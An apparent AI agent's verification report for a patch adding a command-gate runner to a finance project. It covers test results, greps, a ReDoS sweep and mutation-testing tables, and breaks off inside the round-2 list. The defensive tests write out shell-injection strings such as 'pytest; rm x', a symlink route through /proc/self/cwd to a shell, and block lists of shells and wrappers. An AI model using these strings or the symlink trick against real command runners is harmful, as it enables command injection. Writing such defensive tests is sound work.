**1. The patch applies byte-exact.** `git apply --check` and `git apply` of `_workspace/02_strategy-architect_C9.patch` on a clean `git archive 588dd9b` extraction (the real repository is never touched; its HEAD is now `5baf9f7`, which holds rev 3b): no output, rc 0; the incremental `_workspace/02_strategy-architect_C9_3b_to_3c.patch` (sha256 `e8ef627e55f8a575a8fe5c76e384861ab087e3f85da43df737b61ad0088fecac`) applied on a clean extraction of `5baf9f7` gives the same files, `cmp` identical. `git apply --stat`:

```
 src/master_finhub/evals/gates.py    |  561 ++++++++
 src/master_finhub/sandbox/stream.py |    4 
 tests/gate_matrix.py                |  573 ++++++++
 tests/test_gates.py                 | 2492 +++++++++++++++++++++++++++++++++++
 4 files changed, 3630 insertions(+)
```

After `git apply` on `final/` the four files hash identically to the audited tree (`gates.py` a993f67f8656f729, `stream.py` 180e44ed671760fc, `test_gates.py` d39174c03c8f276f, `gate_matrix.py` ec3de49a01a27a85, first 16 hex of sha256). patch sha256 `56290e7a7600f5ea018fa2395e2233cbc0d9f095643945e5fb0bdc2304f1bb3e`.

**2. C4 untouched.** `sha256sum src/master_finhub/evals/runner.py` = `c34f998b07ad197a9dcfdc090e383e10d0576de243ed83ccc959e1d8e06166e6` before and after (the same hash the C4 notes record), `git diff --stat -- src/master_finhub/evals/runner.py` empty, and `tests/test_evals.py` plus `tests/test_evals_baseline.py` pass unmodified inside the full suite.

**3. Full suite, Python 3.11 (.venv), foreground, one after the other.**

```
$ env -u PYTHONUNBUFFERED PYTHONPATH=$PWD/src .venv/bin/python -B -m pytest -q -p no:cacheprovider
2081 passed, 10 skipped in 134.06s (0:02:14)
$ env PYTHONUNBUFFERED=1 PYTHONPATH=$PWD/src .venv/bin/python -B -m pytest -q -p no:cacheprovider
2081 passed, 10 skipped in 130.04s (0:02:10)
```

**4. Full suite, Python 3.12.3 (scratchpad v312, the version CI runs):** `2081 passed, 10 skipped in 133.91s (0:02:13)`. The baseline (origin/main) collects 1414 tests (1404 pass, 10 skip); with the patch 2091 = 1414 + 677, and 2081 pass, 10 skip: the same 10 platform skips, no new skip, no failure, `test_adversarial_inputs_are_linear` did not fire in any of the three full runs.

**5. New tests on every interpreter, and with warnings as errors** (`-W error` finds unclosed handles; the first draft leaked the devnull handle that `_stdout_lost` parks, fixed in the test helper `main_lost`):

```
677 passed in 25.25s
--- -W error 3.11/3.12/3.13
677 passed in 24.31s
677 passed in 26.68s
677 passed in 25.34s
```

**6. Static checks on `final/`** (ruff, black, mypy --strict, the harness reference check; then the Hangul grep over the four files, rc 1 = no hit; the secrets grep, rc 1; the 8-word verbatim script):

```
== ruff
All checks passed!
== black
All done! ✨ 🍰 ✨
72 files would be left unchanged.
== mypy
Success: no issues found in 40 source files
== hangul
rc=1
== secrets
rc=1
== check-harness-refs
PASS agent file boundary-qa
PASS six agent files
PASS CLAUDE.md says six-agent
PASS no Hangul in agents+triage
PASS packager exit 0
```

**7. Greps that must return exactly this on the final files:**

```
$ grep -c "shell=True" gates.py
0
$ grep -nE "import subprocess|os\.system|os\.popen|subprocess\." gates.py ; rc
rc=1
$ grep -n "stream_process(" gates.py
432:            stream_process(plan.argv, env=scrubbed_env(), timeout_s=timeout_s, cwd=str(plan.cwd))
$ grep -n "guard_tool_call(" gates.py
403:        denial = guard_tool_call(ToolCall("gate", "gate", {"command": line, "cwd": str(cwd)}))
$ grep -nE "^import re|^from re " gates.py ; rc
rc=1
$ grep -c gates runner.py
0
$ sha256sum runner.py
c34f998b07ad197a9dcfdc090e383e10d0576de243ed83ccc959e1d8e06166e6  runner.py
$ git status --short   (scratch repo W: base = tracked files of 588dd9b, patch applied)
 A src/master_finhub/evals/gates.py
 M src/master_finhub/sandbox/stream.py
 A tests/gate_matrix.py
 A tests/test_gates.py
$ git diff --stat -- runner.py (empty = untouched)
$ grep -c "_stdout_lost" gates.py
4
$ grep -c "_signals_raise" gates.py
2
$ grep -c "_shell_refusal" gates.py
2
$ grep -c "_resolve" gates.py
2
$ grep -c "_walk" gates.py
4
$ grep -c "_no_dotdot" gates.py
3
$ grep -c "_checked_real" gates.py
0
$ grep -c "NOT detected" gates.py
1
$ grep -c "default_int_handler" test_gates.py
1
$ grep -c "not a sandbox" gates.py
2
$ grep -c "normpath\|realpath" gates.py
0
$ grep -ciE "slippage|borrow|survivorship|pnl|\bfees?\b" gates.py
0
$ grep -n "references/openharness" gates.py
4:Policy adapted (MIT, own code) from references/openharness/src/openharness/autopilot/service.py:155
$ grep -n "cwd=cwd" stream.py
137:        cwd=cwd,
$ git diff --numstat -- stream.py
4	0	src/master_finhub/sandbox/stream.py
$ grep -n "O_PATH" sensitive_paths.py | wc -l
3
$ grep -c "^def test_" test_gates.py
172
$ pytest --collect-only -q tests/test_gates.py | tail -1
677 tests collected in 0.44s
```

**8. The backlog proof, run end to end through the real CLI** (`$V` is the venv interpreter; the `;` in gate `say` is inside the list form and is data):

```
$ python -m master_finhub.evals.gates ok.json  (the backlog proof: argv, ';' inside a list item as data, timeout, missing binary, failing exit)
exit=1
{'schema_version': 1, 'kind': 'gates', 'passed': 2, 'failed': 3, 'total': 5, 'ok': False}
version pass 0 '' 'Python 3.11.15\n'
say pass 0 '' 'a;b\n'
slow timeout None 'timed out after 0.5s' 
missing error None 'executable or folder not found' 
bad fail 3 'exit code 3' 

$ refused.json: "x --version; rm x" next to a fine gate
exit=2
{'schema_version': 1, 'kind': 'gates', 'passed': 0, 'failed': 2, 'total': 2, 'ok': False}
fine not-run None 'another gate was refused' 
chain policy-error None 'shell metacharacters; use argv, or declare shell: true and pass --allow-shell' 

$ empty.json / missing file / --baseline
Gate file: "gates" must be a non-empty list. Fix the gate file and retry.
exit=2
Gate file: not a regular file. Fix the gate file and retry.
exit=2
master_finhub.evals.gates: error: unrecognized arguments: --baseline x
exit=2

$ ATK1: gates.json = sh -c "echo A; echo B > out.txt && echo $0" (no shell:true, no --allow-shell)
exit=2
{'schema_version': 1, 'kind': 'gates', 'passed': 0, 'failed': 1, 'total': 1, 'ok': False}
sh1 policy-error None 'the executable is a shell; declare shell: true and pass --allow-shell' 
out.txt exists: False

$ command "bash -c ls", argv env sh -c, plus an ordinary gate
exit=2
{'schema_version': 1, 'kind': 'gates', 'passed': 0, 'failed': 3, 'total': 3, 'ok': False}
sh2 policy-error None 'the executable is a shell; declare shell: true and pass --allow-shell' 
w policy-error None 'a wrapper is given a shell; declare shell: true and pass --allow-shell' 
ok not-run None 'another gate was refused' 

$ a DECLARED shell gate still works: without then with --allow-shell
exit=2 (no flag) policy-error
exit=0 (--allow-shell) pass B

$ D1 (QA's repro) on this tree: sub/lnk -> /proc/self/cwd, mysh -> a test-made shell in the parent, gate lnk/../mysh with cwd sub, runner in D/a/b, --root D
exit=2
{'schema_version': 1, 'kind': 'gates', 'passed': 0, 'failed': 1, 'total': 1, 'ok': False}
g policy-error None "the executable path has a '..' component, which a link on the way makes ambiguous" 
MARK created: False

$ signals sent to the runner while a 60 s gate runs:
SIGINT runner rc= -2 child alive after: False stdout bytes: 0
SIGTERM runner rc= 143 child alive after: False stdout bytes: 0
SIGHUP runner rc= 129 child alive after: False stdout bytes: 0
```

**9. ReDoS sweep (independent script `02_strategy-architect_C9_redos.py`, runs the ACTUAL code).** `gates.py` has no regex (`test_the_module_has_no_regex`). It feeds two regex-bearing modules, so the script sweeps both, through the gate path and directly: 20 output shapes x 4,096 / 200,000 / 1,000,000 bytes through a real gate run into `redact_secrets` (the gate captures the last 64,000 bytes), the same 20 shapes directly into `redact_secrets` at the full size, 20 command shapes through `plan_gate` in the string, list, many-item and shell forms at the 4,096-character caps, the same shapes directly into `check_command` at 4,096 / 10,000 / 10,001 / 200,000 / 1,000,000 characters, and the loader on padded and deeply nested files of 4,096 / 262,144 / 1,000,000 bytes. 346 rows per interpreter, limit 5 s per row:

```
3.11: rules in the table: 10; limit 5.0s; overall OK; SLOW rows 0; 346 rows; slowest row 0.140 s
3.12: rules in the table: 10; limit 5.0s; overall OK; SLOW rows 0; 346 rows; slowest row 0.146 s
3.13: rules in the table: 10; limit 5.0s; overall OK; SLOW rows 0; 346 rows; slowest row 0.125 s
```

**10. The three rejections reproduced on the rev-1 tree, then fixed (rev 2).** The rev-1 patch applied to a tar copy was run as in the verdict, and the rev-2 tree in the same environments. `nobody` has no access to the scratchpad, so those runs used a throwaway copy of `src/`, `tests/` and `pyproject.toml` under `/tmp/c9_nobody` owned by `nobody`, started with `setpriv --reuid=nobody --regid=nogroup --clear-groups`; the `trap` runs use a script that ignores SIGINT (and SIGHUP) and `exec`s pytest.

```
REPRO rev1 (the round-1 verdict's commands on the rev-1 patch): nobody + repo PATH: 1 failed, 365 passed (test_missing_executable_is_an_error_not_a_pass); trap '' INT: 1 failed, 1 passed, 364 deselected in 31.31s (a_signal_to_the_runner[SIGINT], TimeoutExpired)
rev3c, 677 passed cases (tests/test_gates.py incl. matrix, fuzz), shipped tree (patch applied to origin/main 588dd9b):
trap '' INT (3.11)                                   677 passed in 24.82s
trap '' INT and HUP (3.11)                           677 passed in 25.29s
3.11 setsid --wait nohup, stdin /dev/null            677 passed in 24.99s
3.11 stdin closed                                    677 passed in 25.32s
root, env -i PATH=/usr/local/bin:/usr/bin:/bin       677 passed in 24.93s
nobody (uid 65534, copy under /tmp/c9c_nobody), inherited PATH 677 passed in 25.01s
3.12 new tests                                       677 passed in 26.81s
3.13 new tests                                       677 passed in 25.25s
root, plain (3.11, 3.12, 3.13)                       677 passed in 25.00s | 677 passed in 26.81s | 677 passed in 25.25s
```

ATK1 reproduced on rev 1 with the real CLI: `{"id":"sh1","argv":["sh","-c","echo A; echo B > out.txt && echo $0"]}` ran (pass, exit 0, `out.txt` created); on rev 2 the same file exits 2, status `policy-error`, nothing spawned, no `out.txt` (`test_a_shell_gate_in_a_file_spawns_nothing_and_exits_2`, real CLI).

**11. The judge's 50 independent mutants I01-I50** (`02_strategy-architect_C9_judge_mutants.py`, adapted from the verdict's `j9/indep.py`: same 50 edits, same method, run on the rev-2 tree; the one edit whose text changed in rev 2, I28, is re-expressed against the new text and marked):

```
I01 | no strip of the command string | KILLED | FAILED tests/test_gates.py::test_plain_strings_become_argv[pytest -q\n-argv3]
I02 | length cap >= instead of > | KILLED | FAILED tests/test_gates.py::test_plain_strings_become_argv[xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
I03 | metachar scan only on first char | KILLED | FAILED tests/test_gates.py::test_proof_metachar_is_a_policy_error_and_nothing_spawns
I04 | metachar scan only outside quotes (strip quoted bits) | KILLED | FAILED tests/test_gates.py::test_metacharacters_refused_even_inside_quotes[pytest -k 'a;b']
I05 | shlex comments=True | KILLED | FAILED tests/test_gates.py::test_plain_strings_become_argv[pytest # c-argv10]
I06 | shlex posix=False | KILLED | FAILED tests/test_gates.py::test_proof_plain_string_runs_as_argv - AssertionE...
I07 | executable dash check only -- | KILLED | FAILED tests/test_gates.py::test_plain_strings_refused[-q pytest-starts with '-']
I08 | executable = check only trailing | KILLED | FAILED tests/test_gates.py::test_plain_strings_refused[A=b pytest-contains '=']
I09 | NUL checked only in argv[0] | KILLED | FAILED tests/test_gates.py::test_argv_form_refused[argv5-NUL] - AssertionErro...
I10 | encodability checked only argv[0] | KILLED | FAILED tests/test_gates.py::test_argv_form_refused[argv6-not valid text] - As...
I11 | item length checked only argv[0] | KILLED | FAILED tests/test_gates.py::test_argv_item_length_boundary - AssertionError: ...
I12 | cwd existence instead of is_dir | KILLED | FAILED tests/test_gates.py::test_cwd_must_be_an_existing_folder - AssertionEr...
I13 | guard sees only the executable | KILLED | FAILED tests/test_gates.py::test_plain_strings_refused[-empty command] - Asse...
I14 | guard cwd is the raw unresolved cwd | KILLED | FAILED tests/test_gates.py::test_guard_runs_on_the_joined_argv_and_is_called_once
I15 | pass counted for not-run | KILLED | FAILED tests/test_gates.py::test_a_refused_gate_spawns_nothing_and_skips_every_gate[pytest; rm x-first]
I16 | ok without non-empty check | KILLED | FAILED tests/test_gates.py::test_status_to_exit_code[statuses_in11-1] - asser...
I17 | spawn uses unresolved gate cwd | KILLED | FAILED tests/test_gates.py::test_a_declared_shell_gate_still_runs_through_sh_when_allowed
I18 | --root ignored | KILLED | FAILED tests/test_gates.py::test_the_real_cli_refuses_a_relative_link_to_a_shell_and_creates_nothing[root-sub]
I19 | check_write instead of check_read | KILLED | FAILED tests/test_gates.py::test_proof_plain_string_runs_as_argv - AssertionE...
I20 | shell path via PATH lookup | KILLED | FAILED tests/test_gates.py::test_proof_shell_true_only_when_declared_and_allowed
I21 | FIFO check exists instead of isfile | KILLED | FAILED tests/test_gates.py::test_missing_or_directory_gate_file_exit_2[directory]
I22 | BOM accepted | KILLED | FAILED tests/test_gates.py::test_bad_raw_file_is_refused[bom] - Failed: DID N...
I23 | RecursionError not caught at load | KILLED | FAILED tests/test_gates.py::test_bad_raw_file_is_refused[deep-nesting] - Recu...
I24 | schema_version bool/float accepted | KILLED | FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[version-true]
I25 | empty gates accepted at load | KILLED | FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[empty-list]
I26 | total budget boundary < instead of <= | KILLED | FAILED tests/test_gates.py::test_total_budget_boundary_with_a_frozen_clock - ...
I27 | total_s param ignored | KILLED | FAILED tests/test_gates.py::test_total_budget_spent_means_not_run_never_pass
I28 | SIGTERM handler not restored (re-expressed for rev 2) | KILLED | FAILED tests/test_gates.py::test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored[SIGTERM]
I29 | redaction skipped on stderr only | KILLED | FAILED tests/test_gates.py::test_tails_are_redacted - AssertionError: assert ...
I30 | cut flag drops capture truncation | KILLED | FAILED tests/test_gates.py::test_capture_truncation_counts_even_when_redaction_shrinks_the_text
I31 | tail takes the head | KILLED | FAILED tests/test_gates.py::test_the_tail_is_the_end_of_the_output - Assertio...
I32 | signal death reported as pass | KILLED | FAILED tests/test_gates.py::test_exit_code_mapping - AssertionError: assert (...
I33 | timeout check after exit code | KILLED | FAILED tests/test_gates.py::test_timeout_outranks_an_exit_code_of_zero - Asse...
I34 | policy error exit when only some refused -> 1 if any fail | KILLED | FAILED tests/test_gates.py::test_a_refused_gate_spawns_nothing_and_skips_every_gate[pytest; rm x-first]
I35 | shell gate guard line is the argv join | KILLED | FAILED tests/test_gates.py::test_guard_runs_on_the_joined_argv_and_is_called_once
I36 | shell: refused-without-flag check removed order (allow_shell ignored when argv nonblank) | KILLED | FAILED tests/test_gates.py::test_proof_shell_true_only_when_declared_and_allowed
I37 | plan crash not fail-closed (re-raise) | KILLED | FAILED tests/test_gates.py::test_a_guard_crash_is_a_refusal_not_a_spawn - Run...
I38 | duplicate JSON keys last-wins | KILLED | FAILED tests/test_gates.py::test_bad_raw_file_is_refused[duplicate-root-key]
I39 | unknown gate keys tolerated | KILLED | FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[gate-unknown-key]
I40 | id charset: leading dash allowed | KILLED | FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[id-leading-dash]
I41 | timeout bool accepted | KILLED | FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[timeout-true]
I42 | timeout lower bound >= 0 | KILLED | FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[timeout-zero]
I43 | argv list items need not be strings | KILLED | FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[argv-number-item]
I44 | stream: stdout tail cap 64000 -> unbounded | KILLED | FAILED tests/test_gates.py::test_capture_truncation_counts_even_when_redaction_shrinks_the_text
I45 | exit chunk emitted even if proc not finished (rc None) -> str(None) | SURVIVED | 677 passed in 29.78s
I46 | stream: finally does not killpg | KILLED | FAILED tests/test_gates.py::test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass[SIGINT]
I47 | env scrub extra keys | KILLED | FAILED tests/test_gates.py::test_spawn_arguments - AssertionError: assert ('k...
I48 | Gate dataclass default shell: command argv path ignores nonlist | SURVIVED | 677 passed in 27.35s
I49 | report counts failed wrong | KILLED | FAILED tests/test_gates.py::test_every_gate_runs_after_a_failure - assert (2,...
I50 | not-run message status policy-error for others | KILLED | FAILED tests/test_gates.py::test_a_refused_gate_spawns_nothing_and_skips_every_gate[pytest; rm x-first]
TOTAL 50 killed 48 survived ['I45', 'I48'] bad []
```

**11d. The QA batch Q01-Q90** (`02_strategy-architect_C9_qa_mutants.py`, from the QA report's `q9x/mut/qamut.py`, run on the shipped rev-3c tree; Q14-Q16, Q21, Q23, Q25, Q29, Q30 re-expressed; Q17-Q20, Q22, Q24 and Q26 are N/A because rev 3c removed the code they mutated: `normpath`, the final `realpath` check and the link-walk helper, so 83 of the 90 run). Q25 and Q42, which survived in QA's run, now die; Q26's code no longer exists (its closest forms are the mutants W21 and W22 and the real-CLI rows r19-r21, r58, r59); Q90 is equivalent, and so is the new Q30 (the PATH entry walked before the candidate): the candidate's own walk passes through the same components, so the entry walk is a second line of defence with the same verdicts, kept on purpose:

```
Q01 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('BASH', '-c', 'a')]
Q02 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('bash.exe', '-c', 'a')]
Q03 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/bin/sh', '-c', 'id && id')]
Q04 KILLED FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
Q05 KILLED FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
Q06 KILLED FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
Q07 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('csh', '-c', 'a')]
Q08 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('zsh', '-c', 'a;b')]
Q09 KILLED FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
Q10 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('watch', 'ls')]
Q11 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('su', '-c', 'a;b')]
Q12 KILLED FAILED tests/test_gates.py::test_a_non_executable_file_on_path_is_skipped_like_the_child_does
Q13 KILLED FAILED tests/test_gates.py::test_a_directory_of_the_same_name_on_path_is_skipped_like_the_child_does
Q14 KILLED FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
Q15 KILLED FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
Q16 KILLED FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
Q21 KILLED FAILED tests/test_gates.py::test_proof_plain_string_runs_as_argv - AssertionE...
Q23 KILLED FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
Q25 KILLED FAILED tests/test_gates.py::test_the_root_names_are_matched_whole_so_a_sibling_folder_is_not_inside_them
Q27 KILLED FAILED tests/test_gates.py::test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder[8]
Q28 KILLED FAILED tests/test_gates.py::test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder[0]
Q29 KILLED FAILED tests/test_gates.py::test_a_path_under_proc_or_dev_is_refused_with_the_runner_in_another_folder[0]
Q30 SURVIVED 
Q31 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/usr/bin/env', 'bash')]
Q32 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('env', 'A=1', 'bash')]
Q33 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('/usr/bin/env', 'bash')]
Q34 KILLED FAILED tests/test_gates.py::test_ordinary_programs_are_not_mistaken_for_shells[pytest -k bash]
Q35 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('find', '.', '-exec', 'sh', '-c', 
Q36 KILLED FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('timeout', '5', 'sh', '-c', 'a')]
Q37 KILLED FAILED tests/test_gates.py::test_good_file_loads_exactly - master_finhub.eval...
Q38 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[shell-string]
Q39 KILLED FAILED tests/test_gates.py::test_proof_shell_true_only_when_declared_and_allowed
Q40 KILLED FAILED tests/test_gates.py::test_every_metacharacter_is_refused['\\r'] - Asse...
Q41 KILLED FAILED tests/test_gates.py::test_every_metacharacter_is_refused['`'] - Assert...
Q42 KILLED FAILED tests/test_gates.py::test_a_metacharacter_as_the_first_character_is_refused_too[';']
Q43 KILLED FAILED tests/test_gates.py::test_proof_plain_string_runs_as_argv - AssertionE...
Q44 KILLED FAILED tests/test_gates.py::test_proof_plain_string_runs_as_argv - AssertionE...
Q45 KILLED FAILED tests/test_gates.py::test_plain_strings_become_argv[xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
Q46 KILLED FAILED tests/test_gates.py::test_spawn_arguments - AssertionError: assert ('k...
Q47 KILLED FAILED tests/test_gates.py::test_a_declared_shell_gate_still_runs_through_sh_when_allowed
Q48 KILLED FAILED tests/test_gates.py::test_total_budget_caps_the_running_gate_and_skips_the_rest
Q49 KILLED FAILED tests/test_gates.py::test_exit_code_mapping - AssertionError: assert (...
Q50 KILLED FAILED tests/test_gates.py::test_timeout_outranks_an_exit_code_of_zero - Asse...
Q51 KILLED FAILED tests/test_gates.py::test_missing_exit_status_is_an_error - AssertionE...
Q52 KILLED FAILED tests/test_gates.py::test_a_refused_gate_spawns_nothing_and_skips_every_gate[pytest; rm x-first]
Q53 KILLED FAILED tests/test_gates.py::test_total_budget_spent_means_not_run_never_pass
Q54 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[duplicate-id]
Q55 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[empty-list]
Q56 KILLED FAILED tests/test_gates.py::test_gate_count_boundary - master_finhub.evals.ga...
Q57 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[version-true]
Q58 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[gate-unknown-key]
Q59 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[id-non-ascii]
Q60 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[id-65-chars]
Q61 KILLED FAILED tests/test_gates.py::test_bad_raw_file_is_refused[duplicate-root-key]
Q62 KILLED FAILED tests/test_gates.py::test_missing_or_directory_gate_file_exit_2[directory]
Q63 KILLED FAILED tests/test_gates.py::test_file_size_boundary - Failed: DID NOT RAISE G...
Q64 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[timeout-zero]
Q65 KILLED FAILED tests/test_gates.py::test_bad_file_is_refused_and_exit_2[timeout-true]
Q66 KILLED FAILED tests/test_gates.py::test_proof_metachar_is_a_policy_error_and_nothing_spawns
Q67 KILLED FAILED tests/test_gates.py::test_shell_names_and_wrappers_are_the_documented_lists
Q68 KILLED FAILED tests/test_gates.py::test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass[SIGTERM]
Q69 KILLED FAILED tests/test_gates.py::test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored[SIGTERM]
Q70 KILLED FAILED tests/test_gates.py::test_a_declared_shell_gate_still_runs_through_sh_when_allowed
Q71 KILLED FAILED tests/test_gates.py::test_plain_strings_refused[-q pytest-starts with '-']
Q72 KILLED FAILED tests/test_gates.py::test_plain_strings_refused[A=b pytest-contains '=']
Q73 KILLED FAILED tests/test_gates.py::test_argv_form_refused[argv5-NUL] - AssertionErro...
Q74 KILLED FAILED tests/test_gates.py::test_argv_item_count_limit - AssertionError: asse...
Q75 KILLED FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
Q76 KILLED FAILED tests/test_gates.py::test_a_refusal_never_echoes_the_command_or_cwd[{"argv": ["echo"], "cwd": "needle-77"}]
Q77 KILLED FAILED tests/test_gates.py::test_proof_shell_true_only_when_declared_and_allowed
Q78 KILLED FAILED tests/test_gates.py::test_huge_argv_is_refused_by_the_guard_cap - Asse...
Q79 KILLED FAILED tests/test_gates.py::test_plain_strings_refused[-empty command] - Asse...
Q80 KILLED FAILED tests/test_gates.py::test_tails_are_redacted - AssertionError: assert ...
Q81 KILLED FAILED tests/test_gates.py::test_the_tail_is_the_end_of_the_output - Assertio...
Q82 KILLED FAILED tests/test_gates.py::test_capture_truncation_counts_even_when_redaction_shrinks_the_text
Q83 KILLED FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
Q84 KILLED FAILED tests/test_gates.py::test_good_file_loads_exactly - AssertionError: as...
Q85 KILLED FAILED tests/test_gates.py::test_one_spawn_per_gate_in_declared_order - Asser...
Q86 KILLED FAILED tests/test_gates.py::test_every_gate_runs_after_a_failure - assert (2,...
Q87 KILLED FAILED tests/test_gates.py::test_other_spawn_failures_are_errors_without_the_exception_text
Q88 KILLED FAILED tests/test_gates.py::test_a_lost_report_is_exit_2[pass-write] - Assert...
Q89 KILLED FAILED tests/test_gates.py::test_proof_shell_true_only_when_declared_and_allowed
Q90 SURVIVED 
TOTAL 83 killed 81 survived ['Q30', 'Q90'] errors [] 213
```

**11c. The judge's round-3 mutants K01-K15** (`02_strategy-architect_C9_judge_r3_mutants.py`, from the round-3 verdict's `j9r3/r3mut.py`; K01-K04, K09, K10 re-expressed against the rev-3c text, same intent; K09 now returns the hit unwalked, because rev 3c walks it before the file test). K08 (the PATH search takes the last hit) is the one that survived in round 3; it is killed now by `test_the_first_path_hit_wins_not_the_last`:

```
K01 KILLED slash word resolved from runner cwd (realpath(word)) FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
K02 KILLED slash word joined onto os.getcwd() FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
K03 KILLED PATH entry not anchored on the gate cwd FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
K04 KILLED PATH entry anchored on runner cwd FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
K05 KILLED no executable test on the PATH hit FAILED tests/test_gates.py::test_a_non_executable_file_on_path_is_skipped_like_the_child_does
K06 KILLED exists instead of isfile (directory counts) FAILED tests/test_gates.py::test_a_directory_of_the_same_name_on_path_is_skipped_like_the_child_does
K07 KILLED relative PATH entries ignored FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
K08 KILLED last PATH hit instead of first FAILED tests/test_gates.py::test_the_first_path_hit_wins_not_the_last - Asser...
K09 KILLED PATH hit not realpath-ed (rev 3c text: the hit is returned unwalked) FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
K10 KILLED path word not realpath-ed (abspath) FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
K11 KILLED default PATH instead of the process PATH FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[bin]
K12 KILLED resolved name never added FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
K13 KILLED shell check runs on cwd=Path.cwd() (fence order irrelevant) FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
K14 KILLED shell check skipped when the cwd is not the root FAILED tests/test_gates.py::test_a_relative_symlink_to_a_shell_is_refused_from_the_gate_cwd_not_the_runner_cwd
K15 KILLED empty PATH entry skipped FAILED tests/test_gates.py::test_a_bare_name_is_searched_along_a_relative_or_empty_path_entry_from_the_gate_cwd[]
TOTAL 15 killed 15 survived []
```

**11b. The judge's round-2 mutants J01-J48** (`02_strategy-architect_C9_judge_r2_mutants.py`, from the round-2 verdict's `j9r2/mut/r2mut.py`, run on the shipped rev-3 tree; J08-J11 and J19-J21 are re-expressed against the rev-3 text, same intent; J11 is now killed because the slash test moved into `_resolve`). J14 and J23 are the two equivalents the judge ruled in round 2:

```
J01 | su/watch refusal removed | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('su', '-c', 'a;b')]
J02 | SHELL_RUNNERS loses watch | KILLED | FAILED tests/test_gates.py::test_a_shell_or_a_wrapper_handed_a_shell_is_refused_in_a_non_shell_gate[argv-('watch', 'ls')]
